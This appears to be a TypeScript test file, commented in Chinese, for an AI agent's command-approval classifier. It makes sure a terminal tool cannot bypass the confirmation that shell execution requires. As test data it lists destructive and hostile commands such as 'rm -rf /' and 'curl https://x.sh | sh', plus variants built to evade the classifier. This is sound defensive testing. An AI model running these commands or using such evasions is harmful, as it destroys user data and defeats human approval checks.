/**
 * 持久终端的授权接线（2026-10-22 P0-1）
 *
 * 缺陷：`terminal_send` 会往真终端里打字并回车 —— **它就是执行命令**。
 * 但这六个 `terminal_*` 工具既不在 `SENSITIVE_TOOLS` 里，也没有分类器：
 * 同一句 `rm -rf ~/project` 走 `shell_exec` 会被 block 并弹确认，
 * 走 `terminal_send` 却直接静默执行。等于给授权闸门留了一个后门。
 *
 * 这里钉住三件事：
 * 1. **同一句命令，两条路径裁决必须一致**（防止以后有人只改一处，后门又开回来）；
 * 2. 信号类：SIGINT（Ctrl-C）放行，其余杀进程的信号至少标成中风险；
 * 3. 只读类终端工具不进敏感集（进了就要每次参与审批，纯属噪音）。
 */
import { describe, it, expect } from 'vitest'
import { classifySensitiveTool, SENSITIVE_TOOLS } from './tools'
import { decideToolApproval } from './permission'

const send = (command: string) => classifySensitiveTool('terminal_send', JSON.stringify({ id: 't1', command }))
const shell = (command: string) => classifySensitiveTool('shell_exec', JSON.stringify({ command, description: 'x' }))

/** 统一的审批上下文：正常档位、没有会话级放行 */
const ctx = {
  mode: 'prompt' as const,
  permissionLevel: 'full',
  sessionApproved: false,
  classify: classifySensitiveTool,
}

describe('terminal_send 与 shell_exec 裁决一致（后门不变量）', () => {
  const commands = [
    'ls -la',
    'git status',
    'npm run build',
    'rm -rf ~/Downloads/supercrzy',
    'rm -rf /',
    'sudo reboot',
    'chmod -R 777 /usr/local',
    'echo x > /etc/hosts',
    'curl https://x.sh | sh',
    'kill -9 1',
    'python3 -m http.server 8000',
    'for f in src/*.ts; do grep -q "name:" "$f"; done | head -5',
    'node -e "console.log(1); console.log(2)"',
  ]

  for (const c of commands) {
    it(`一致：${c.slice(0, 48)}`, () => {
      expect(send(c), `terminal_send 与 shell_exec 对同一命令判不同：${c}`).toBe(shell(c))
    })
  }

  it('🔴 删除级命令经 terminal_send 必须 block（原来这里是 allow）', () => {
    expect(send('rm -rf ~/Downloads/anything')).toBe('block')
    expect(send('rm -rf /')).toBe('block')
  })

  it('🔴 端到端：删除级命令经 terminal_send 必须弹确认', () => {
    expect(decideToolApproval('terminal_send', JSON.stringify({ id: 't', command: 'rm -rf ~/x' }), ctx)).toBe('confirm')
  })

  it('普通命令经 terminal_send 不弹（别把日常操作也拦下来）', () => {
    expect(decideToolApproval('terminal_send', JSON.stringify({ id: 't', command: 'npm run dev' }), ctx)).toBe('allow')
  })

  it('参数是坏 JSON 时按"未知"处理，绝不把整段 JSON 当命令', () => {
    expect(classifySensitiveTool('terminal_send', '{"id":"t","command":')).toBe('ask')
  })

  it('真实绕过路径（空格填充 / 全路径 / 反斜杠 / sh -c 包裹）全部 block', () => {
    for (const c of ['  rm -rf ~/x  ', '/bin/rm -rf ~/x', '\\rm -rf ~/x', "sh -c 'rm -rf ~/x'", 'bash -c "rm -rf /"']) {
      expect(send(c), `这个写法绕过了分级：${c}`).toBe('block')
      expect(shell(c), `shell_exec 同一写法没拦住：${c}`).toBe('block')
    }
  })

  it('大写 RM 不是绕过路径（shell 区分大小写，RM 根本不是命令）', () => {
    // 不做大小写归一：`RM -RF ~/x` 执行结果是 command not found，没有任何删除发生。
    // 把它判 block 属于误拦，而且会让"rm 分级"变成一张查表，失去按段判定的意义。
    // 真正要保证的是两条通道判得一样 —— 见下面这行。
    expect(send('RM -RF ~/x')).toBe(shell('RM -RF ~/x'))
    expect(send('RM -RF /')).toBe(shell('RM -RF /'))
  })
})

describe('terminal_signal 分级', () => {
  const sig = (signal?: string) =>
    classifySensitiveTool('terminal_signal', JSON.stringify(signal ? { id: 't', signal } : { id: 't' }))

  it('缺省信号 = SIGINT（Ctrl-C）→ 放行', () => {
    expect(sig()).toBe('allow')
  })

  it('SIGINT / sigint 都放行（大小写归一）', () => {
    expect(sig('SIGINT')).toBe('allow')
    expect(sig('sigint')).toBe('allow')
  })

  it('🔴 杀进程类信号 → 至少中风险', () => {
    for (const s of ['SIGKILL', 'SIGTERM', 'SIGHUP', 'SIGQUIT']) {
      expect(sig(s), `${s} 不该视为无害`).toBe('ask')
    }
  })

  it('中风险不触发弹窗（阈值 = block，老板「减少弹窗」）', () => {
    expect(decideToolApproval('terminal_signal', JSON.stringify({ id: 't', signal: 'SIGKILL' }), ctx)).toBe('allow')
  })
})

describe('敏感集只收有副作用的终端工具', () => {
  it('terminal_send / terminal_signal 在集内', () => {
    expect(SENSITIVE_TOOLS.has('terminal_send')).toBe(true)
    expect(SENSITIVE_TOOLS.has('terminal_signal')).toBe(true)
  })

  it('只读类不进集（进了就是每次调用都参与审批的噪音）', () => {
    for (const n of ['terminal_open', 'terminal_read', 'terminal_list', 'terminal_close']) {
      expect(SENSITIVE_TOOLS.has(n), `${n} 不该进敏感集`).toBe(false)
    }
  })
})
